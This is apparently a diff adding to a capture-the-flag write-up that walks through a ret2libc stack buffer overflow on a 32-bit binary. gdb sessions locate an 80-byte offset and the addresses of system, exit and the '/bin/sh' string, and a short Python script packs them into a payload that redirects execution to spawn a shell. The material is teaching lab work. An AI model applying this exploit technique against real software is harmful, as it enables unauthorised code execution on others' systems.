@@ -99,3 +99,105 @@ There is some rubbish before we put value to `$ebp - 0x4c` variable. But after:
 		$1 = (void *) 0xbffff6fc
 	(gdb) p/x *0xbffff6fc
 		$3 = 0x804854a
+
+That is return address from the `info frame`. In C return address can be saved with `__builtin_return_address function`.\
+Now we need to find the buffer size.
+
+	(gdb) print $ebp-0x4c
+		$10 = (void *) 0xbffff6ac
+	(gdb) print $ebp-0xc
+		$11 = (void *) 0xbffff6ec
+	(gdb) print 0xbffff6ec - 0xbffff6ac
+		$15 = 64
+
+We can overwrite buffer here. If we play a bit with buffer and check the stack with:
+	
+	(gdb)  x/50x 0xbffff6ac
+
+We see that return address lies 80 bytes after the beginning of the buffer.
+
+	(gdb) print 0xbffff6fc - 0xbffff6ac
+		$16 = 80
+
+Let's continue with examination:
+
+	(gdb) x/20cb 0x8048620
+		0x8048620:	40 '('	37 '%'	112 'p'	41 ')'	10 '\n'	0 '\000'	0 '\000'	0 '\000'
+
+Numbers in hex are transferred to decimal with the help of programming calculator and finally we write the code in C.
+
+# Exploitation
+
+We can overwrite the return address and call system function with arguments. But they should be properly written to the stack.
+
+> We’ll write the address of system to the location of the return address that we found. When ret command is executed, the stack pointer would move down to point to “return address 2”, which is where system function will expect its return address to be located (we’ll ignore it for now). The 4 bytes after that would be the first argument to system, so we need to put the address of string “/bin/sh” there.
+
+In order to exploit this level we will need return address from the `p` function, `system` function address, `exit` function address and `/bin/sh` string address:
+
+	1. **0x0804853e** <+106>:	ret - return address from p to main function. We should put it instead of 0x0804854a to cal system function
+	2. $9 = {<text variable, no debug info>} 0xb7e6b060 <system>
+
+	(gdb) p system
+		$9 = {<text variable, no debug info>} 0xb7e6b060 <system>
+
+	3. 0xb7f8cc58:	 "/bin/sh"
+
+	(gdb) info proc map
+		0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+	(gdb) find 0xb7e2c000, +9999999, "/bin/sh"
+		0xb7f8cc58
+	(gdb) x/s 0xb7f8cc58
+		0xb7f8cc58:	 "/bin/sh"
+
+	4. 0xb7e5ebe0 <exit>
+
+	(gdb) p exit
+		$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
+
+And now let's write exploitation:
+
+	#!/usr/bin/python
+	import struct
+	
+	buffer = ''
+	buffer += 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT' # junk 80 letters
+	buffer += struct.pack('I', 0x0804853e) # address of ret in p()
+	buffer += struct.pack('I', 0xb7e6b060) # system
+	buffer += struct.pack('I', 0xb7e5ebe0) # exit
+	buffer += struct.pack('I', 0xb7f8cc58) # "/bin/sh"
+	print(buffer)
+
+And in `gdb` its work:
+
+	(gdb) x/3i $eip
+		=> 0x80484f2 <p+30>:	mov    eax,DWORD PTR [ebp+0x4]
+		0x80484f5 <p+33>:	mov    DWORD PTR [ebp-0xc],eax
+		0x80484f8 <p+36>:	mov    eax,DWORD PTR [ebp-0xc]
+	(gdb) x/80x $esp
+		0xbffff670:	0xbffff68c	0x00000000	0x00000000	0xb7e5ec73
+		0xbffff680:	0x080482b5	0x00000000	0x00c30000	0x41414141
+		0xbffff690:	0x42424242	0x43434343	0x44444444	0x45454545
+		0xbffff6a0:	0x46464646	0x47474747	0x48484848	0x49494949
+		0xbffff6b0:	0x4a4a4a4a	0x4b4b4b4b	0x4c4c4c4c	0x4d4d4d4d
+		0xbffff6c0:	0x4e4e4e4e	0x4f4f4f4f	0x50505050	0x51515151
+		0xbffff6d0:	0x52525252	0x53535353	0x54545454	**0x0804853e**
+		0xbffff6e0:	**0xb7e6b060**	**0xb7e5ebe0**	**0xb7f8cc58**	0xb7e45400
+		0xbffff6f0:	0x00000001	0xbffff784	0xbffff78c	0xb7fdc858
+		0xbffff700:	0x00000000	0xbffff71c	0xbffff78c	0x00000000
+		0xbffff710:	0x08048260	0xb7fd0ff4	0x00000000	0x00000000
+		0xbffff720:	0x00000000	0xfcda27ff	0xcb9ee3ef	0x00000000
+		0xbffff730:	0x00000000	0x00000000	0x00000001	0x08048420
+		0xbffff740:	0x00000000	0xb7ff26b0	0xb7e453e9	0xb7ffeff4
+		0xbffff750:	0x00000001	0x08048420	0x00000000	0x08048441
+		0xbffff760:	0x0804853f	0x00000001	0xbffff784	0x08048550
+		0xbffff770:	0x080485c0	0xb7fed280	0xbffff77c	0xb7fff918
+		0xbffff780:	0x00000001	0xbffff8ad	0x00000000	0xbffff8c6
+
+When we enter `system` function:
+
+	(gdb) x/3i $eip
+		=> 0xb7e6b060 <system>:	sub    esp,0x1c
+		0xb7e6b063 <system+3>:	mov    DWORD PTR [esp+0x14],esi
+		0xb7e6b067 <system+7>:	mov    esi,DWORD PTR [esp+0x20]
+	(gdb) x/80x $esp
+		0xbffff6e4:	**0xb7e5ebe0**	**0xb7f8cc58**	0xb7e45400	0x00000001
